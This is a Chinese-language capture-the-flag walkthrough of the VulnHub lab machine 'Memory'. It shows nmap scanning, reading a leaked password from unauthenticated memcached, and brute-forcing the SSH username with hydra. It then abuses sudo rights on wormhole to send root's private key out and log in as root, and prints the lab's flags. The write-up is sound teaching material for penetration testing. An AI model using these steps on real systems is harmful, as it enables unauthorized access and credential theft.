---
title: Memory
date: 2026-05-03
categories:
  - 靶机
  - vulnhub
---

![](https://cdn.nlark.com/yuque/0/2025/png/1890547/1766912605570-c9e37f92-c366-4225-b0a5-38b1c34ea58d.png)

## 1.nmap

- 快速全面扫描发现端口

```
sudo nmap -n -Pn -sS -p- --min-rate 5000 192.168.3.25
```

![](https://cdn.nlark.com/yuque/0/2025/png/1890547/1766913558711-e3551d0e-4e68-48d8-9b8b-85bb982054c3.png?x-oss-process=image%2Fcrop%2Cx_0%2Cy_0%2Cw_2560%2Ch_639)

|   |   |   |
|---|---|---|
|参数|全称/含义|作用|
|`-n`|**No DNS resolution**|**不进行 DNS 反向解析**，直接显示 IP，提高扫描速度|
|`-Pn`|**Skip host discovery (Assume host is up)**|**跳过主机发现阶段**，不发送 Ping，直接扫描端口。适用于防火墙屏蔽 ICMP 的主机|
|`-sS`|**TCP SYN Scan (Half-open scan)**|**最常用的扫描方式**，发送 SYN 包，如果收到 SYN-ACK 则认为端口开放，然后立刻发送 RST 终止连接。相比完整 TCP 连接更隐蔽、更快|
|`-p-`|**Scan all ports (1-65535)**|扫描 **全部 65535 个 TCP 端口**，而不仅限于常见的 1000 个端口|
|`--min-rate 5000`|**Minimum packet send rate: 5000 packets/sec**|控制 Nmap **每秒至少发送 5000 个探测包**，大幅 **加快扫描速度**，但可能会增加网络负载或被防火墙拦截的风险|
|`192.168.3.25`|**目标 IP 地址**|要扫描的主机 IP|

- 探测目标主机 22、80、11211 端口的开放状态、对应服务版本信息，并执行默认脚本扫描以获取额外安全相关信息

```
nmap -sVC -p 22,80,11211 192.168.3.25
```

![](https://cdn.nlark.com/yuque/0/2025/png/1890547/1766913748541-a7e0469c-a060-40c8-a297-acdc250c5442.png?x-oss-process=image%2Fcrop%2Cx_0%2Cy_556%2Cw_2560%2Ch_725)

## 2.11211/TCP (MEMCACHE)

这里可以参考网站测试

[11211 - Pentesting Memcache - HackTricks](https://book.hacktricks.wiki/en/network-services-pentesting/11211-memcache/index.html#manual)

- 连接（或者nc）

```
➜  ~ telnet 192.168.3.25 11211
Trying 192.168.3.25...
Connected to 192.168.3.25.
Escape character is '^]'.
version
VERSION 1.6.18
```

Telnet 是基于 TCP 协议的远程登录 / 端口测试工具，核心价值在于 **快速验证端口连通性** 和 **手动交互测试服务**（无需复杂工具），在渗透测试中常用于补充 Nmap 扫描结果、验证服务存活状态，

- 列表 查找数据

```
stats items
STAT items:1:number 1
STAT items:1:number_hot 0
STAT items:1:number_warm 0
STAT items:1:number_cold 1
STAT items:1:age_hot 0
STAT items:1:age_warm 0
STAT items:1:age 4065
STAT items:1:mem_requested 82
STAT items:1:evicted 0
STAT items:1:evicted_nonzero 0
STAT items:1:evicted_time 0
STAT items:1:outofmemory 0
STAT items:1:tailrepairs 0
STAT items:1:reclaimed 0
STAT items:1:expired_unfetched 0
STAT items:1:evicted_unfetched 0
STAT items:1:evicted_active 0
STAT items:1:crawler_reclaimed 0
STAT items:1:crawler_items_checked 11
STAT items:1:lrutail_reflocked 0
STAT items:1:moves_to_cold 1
STAT items:1:moves_to_warm 0
STAT items:1:moves_within_lru 0
STAT items:1:direct_reclaims 0
STAT items:1:hits_to_hot 0
STAT items:1:hits_to_warm 0
STAT items:1:hits_to_cold 0
STAT items:1:hits_to_temp 0
END
```

- 下载

找到了密码** `NewPassword2025` **  但不知道用户名

```
stats cachedump 1 0
ITEM password [15 b; 0 s]
END
get password
VALUE password 0 15
NewPassword2025
END
```

## 3.22/TCP (SSH)

### 1. 爆破用户名 （九头蛇）

[name.txt下载地址](https://github.com/danielmiessler/SecLists#)

爆破出了用户名 **`alan`**

```
hydra -t 64 -L /opt/names.txt -p NewPassword2025 -f -V ssh://192.168.3.25
[DATA] max 64 tasks per 1 server, overall 64 tasks, 10713 login tries (l:10713/p:1), ~168 tries per task
[DATA] attacking ssh://192.168.3.25:22/
[ATTEMPT] target 192.168.3.25 - login "aaliyah" - pass "NewPassword2025" - 1 of 10713 [child 0] (0/0)
[ATTEMPT] target 192.168.3.25 - login "aaren" - pass "NewPassword2025" - 2 of 10713 [child 1] (0/0)
#.......
[22][ssh] host: 192.168.3.25   login: alan   password: NewPassword2025
```

|   |   |
|---|---|
|**参数**|**作用说明**|
|`hydra`|开源暴力破解工具核心命令，支持 SSH、FTP、HTTP 等多种服务的爆破测试|
|`-t 64`|设置并发线程数为 64，提升爆破速度；内网环境下 64 线程效率较高，外网建议降低至 10-20 线程（避免被 WAF / 防火墙拦截或目标服务器拒绝服务）|
|`-L /opt/names.txt`|指定**批量用户名列表文件**（大写 L）：1. `-L`<br><br>对应多用户名字典，与单用户名参数 `-l`<br><br>（小写 l）区分；2. 字典路径为 `/opt/names.txt`，文件内每行一个用户名（如 root、admin、user 等）|
|`-p NewPassword2025`|指定**单一固定密码**（小写 p）：密码为 `NewPassword2025`，该参数用于已知疑似统一密码的场景，与多密码字典参数 `-P`(大写 P）区分|
|`ssh://192.168.1.68`|指定爆破目标：协议为 SSH，目标 IP 为 `192.168.1.68`（对应 22 端口，SSH 默认端口可省略，非默认端口需格式化为 `ssh://192.168.1.68:端口号`）|
|`-f`|找到第一个有效用户名 + 密码组合后立即停止爆破（节省时间，适合只需获取一个有效账号的景）|
|`-V`|Print version information|

### 2. 登录

```
➜  ~ sshpass -p 'NewPassword2025' ssh alan@192.168.3.25 -o StrictHostKeyChecking=no
Warning: Permanently added '192.168.3.25' (ED25519) to the list of known hosts.
alan@memory:~$ id
uid=1000(alan) gid=1000(alan) grupos=1000(alan)
```

sshpass的核心作用是：让 ssh命令能够接受密码参数，实现非交互式登录。

## 4.权限提升

### sudo

用户**`alan`** 可以用**`sudo`**以**`root`**身份执行**`wormhole`**命令
```bash
alan@memory:~$ sudo -l
Matching Defaults entries for alan on memory:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User alan may run the following commands on memory:
    (root) NOPASSWD: /usr/bin/wormhole
```

```bash
alan@memory:~$ sudo /usr/bin/wormhole --help
Usage: wormhole [OPTIONS] COMMAND [ARGS]...

  Create a Magic Wormhole and communicate through it.

  Wormholes are created by speaking the same magic CODE in two different
  places at the same time.  Wormholes are secure against anyone who doesn't
  use the same code.

Options:
  --appid APPID                   appid to use
  --relay-url URL                 rendezvous relay to use
  --transit-helper tcp:HOST:PORT  transit relay to use
  --dump-timing FILE.json         (debug) write timing data to file
  --version                       Show the version and exit.
  --help                          Show this message and exit.

Commands:
  help
  receive  Receive a text message, file, or directory (from 'wormhole send')
  send     Send a text message, file, or directory
  ssh      Facilitate sending/receiving SSH public keys
```

ssh Facilitate sending/receiving SSH public keys 便于发送 / 接收 SSH 公钥

### 使用

可以发送**`root`** 的私钥**`id_rsa`**

- 发送

```shell
alan@memory:~$ sudo  /usr/bin/wormhole send /root/.ssh/id_rsa
Sending 2.6 kB file named 'id_rsa'
Wormhole code is: 5-eskimo-cleanup
On the other computer, please run:

wormhole receive 5-eskimo-cleanup

Sending (<-192.168.3.25:53750)..
100%|████████████████████████████████████████████████████████████████████████████████████████████| 2.59k/2.59k [00:00<00:00, 452kB/s]
File sent.. waiting for confirmation
Confirmation received. Transfer complete.
```

- 接收 （这里本地新开一个终端）

```shell
➜  ~ sshpass -p 'NewPassword2025' ssh alan@192.168.3.25 -o StrictHostKeyChecking=no
alan@memory:~$ wormhole receive 5-eskimo-cleanup
Receiving file (2.6 kB) into: id_rsa
ok? (Y/n): Y
Receiving (->tcp:192.168.3.25:36589)..
100%|███████████████████████████████████████████████████████████████████████████████████████████| 2.59k/2.59k [00:00<00:00, 12.4kB/s]
Received file written to id_rsa
```

## Flags

可以使用`root`查找`**user.txt**`和`**root.txt**`

```shell
alan@memory:~$ chmod 600 id_rsa 
alan@memory:~$ ssh -i id_rsa root@192.168.3.25
root@memory:~# find / -name user.txt -o -name root.txt 2>/dev/null | xargs cat 
db516ff5b787b724346d84f61fc5c702
9d1e64f050e5b8ebf3b78fa84199b3cd
root@memory:~# 
```
